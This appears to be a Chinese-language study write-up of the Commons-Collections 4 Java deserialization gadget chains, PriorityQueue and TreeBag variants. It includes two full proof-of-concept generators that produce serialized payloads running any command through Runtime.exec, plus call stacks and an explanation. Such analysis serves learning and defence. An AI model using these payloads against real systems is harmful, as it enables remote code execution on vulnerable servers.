##  CommonsCollections_4

- 本机环境：

  JDK版本：jdk1.7u_51

  CC版本：Commons-Collections 4.0

CC4 是 CC2 的一个变种，用 PriorityQueue 的 TransformingComparator 触发 ChainedTransformer，再利用 InstantiateTransformer 实例化 TemplatesImpl。

先加载依赖

```xml
<!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 -->
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>
```

## POC&复现

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonCollections4 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("snakin");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody("  Runtime.getRuntime().exec(\"" + cmd + "\");" );
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }
    public static void main(String[] args) throws Exception {

        byte[] code = getTemplatesImpl("calc");
        byte[][] bytecodes = {code};

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", bytecodes);
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        /**
         * TrAXFilter 构造函数能直接触发 所以不用利用 invoke 那个
         */
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{obj})
        });

        TransformingComparator comparator = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(2,comparator);

        Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
        size.setAccessible(true);
        size.set(queue,2);

        Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        comparator_field.setAccessible(true);
        comparator_field.set(queue,comparator);

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        // 本地测试触发
        // System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();

    }


}
```

运行即可。

## 流程解析

首先，TrAXFilter构造器传入TemplatesImpl会调用`newTransformer()`，由`InstantiateTransformer.transform()`调用指定的类构造器，`TransformingComparator.compare()`调用`this.transformer.transform()`，PriorityQueue反序列化调用`comparator.compare()`。

看一下调用栈：

```
newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
<init>:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:57, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:526, Constructor (java.lang.reflect)
transform:116, InstantiateTransformer (org.apache.commons.collections4.functors)
transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)
transform:112, ChainedTransformer (org.apache.commons.collections4.functors)
compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
siftDownUsingComparator:699, PriorityQueue (java.util)
siftDown:667, PriorityQueue (java.util)
heapify:713, PriorityQueue (java.util)
readObject:773, PriorityQueue (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:606, Method (java.lang.reflect)
invokeReadObject:1017, ObjectStreamClass (java.io)
readSerialData:1893, ObjectInputStream (java.io)
readOrdinaryObject:1798, ObjectInputStream (java.io)
readObject0:1350, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
main:65, CommonCollections4
```

## cc4之TreeBag链

### TreeBag & TreeMap

在 CC2 中，使用了优先级队列 PriorityQueue 反序列化时会调用 comparator 的 compare 方法的特性，配合 TransformingComparator 触发 transformer。

除了 PriorityQueue，还能否找到其他的提供排序的类，在反序列化时会调用到比较器呢？于是找到了 TreeBag。

对于 Bag 我很陌生，所以这里简单介绍一下。

Bag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。

TreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序。

TreeBag 继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap 储存在成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中。

![image-20220719101650751](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719101650751.png)

在对 TreeBag 反序列化时，会将反序列化出来的 Comparator 对象交给 TreeMap 实例化，并调用父类的 `doReadObject` 方法处理：

![image-20220719101910071](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719101910071.png)

而 `doReadObject` 方法会向 TreeMap 中 put 数据。

![image-20220719101953834](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719101953834.png)

类似优先级队列，对于这种有序的储存数据的集合，反序列化数据时一定会对其进行排序动作，而 TreeBag 则是依赖了 TreeMap 在 put 数据时会调用 compare 进行排序的特点来实现数据顺序的保存。

![image-20220719102219426](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719102219426.png)

compare 方法中调用了 comparator 进行比较，那我们就可以使用 TransformingComparator 触发后续的逻辑。

poc构造：

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonCollections4_treebug {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("snakin");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody("  Runtime.getRuntime().exec(\"" + cmd + "\");" );
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }
    public static void main(String[] args) throws Exception {

        byte[] code = getTemplatesImpl("calc");
        byte[][] bytecodes = {code};

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", bytecodes);
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        /**
         * TrAXFilter 构造函数能直接触发 所以不用利用 invoke 那个
         */
        Transformer            transformer = new InvokerTransformer("toString", new Class[]{}, new Object[]{});
        TransformingComparator comparator  = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comparator);
        tree.add(obj);

        Field field = InvokerTransformer.class.getDeclaredField("iMethodName");
        field.setAccessible(true);
        field.set(transformer, "newTransformer");

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(tree);
        oos.close();

        // 本地测试触发
        // System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();

    }


}
```

调用栈：

```
newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect) [2]
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:606, Method (java.lang.reflect)
transform:129, InvokerTransformer (org.apache.commons.collections4.functors)
compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
compare:1188, TreeMap (java.util)
put:531, TreeMap (java.util)
doReadObject:524, AbstractMapBag (org.apache.commons.collections4.bag)
readObject:129, TreeBag (org.apache.commons.collections4.bag)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect) [1]
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:606, Method (java.lang.reflect)
invokeReadObject:1017, ObjectStreamClass (java.io)
readSerialData:1893, ObjectInputStream (java.io)
readOrdinaryObject:1798, ObjectInputStream (java.io)
readObject0:1350, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
main:75, CommonCollections4_treebug
```

简单总结一下也就是用 TreeBag 代替 PriorityQueue 触发 TransformingComparator，后续依旧使用 Transformer 的调用链。
